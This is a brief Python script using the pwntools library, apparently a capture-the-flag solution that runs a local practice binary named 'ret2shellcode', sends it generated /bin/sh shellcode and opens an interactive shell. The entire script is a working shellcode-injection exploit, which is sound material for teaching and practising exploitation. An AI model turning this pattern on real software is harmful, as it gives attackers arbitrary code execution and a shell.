from pwn import *

context.arch = "amd64"
context.log_level = "debug"

io = process("../attachments/ret2shellcode")

shellcode = asm(shellcraft.sh())

io.sendafter(b"Send me shellcode:\n", shellcode)

io.interactive()
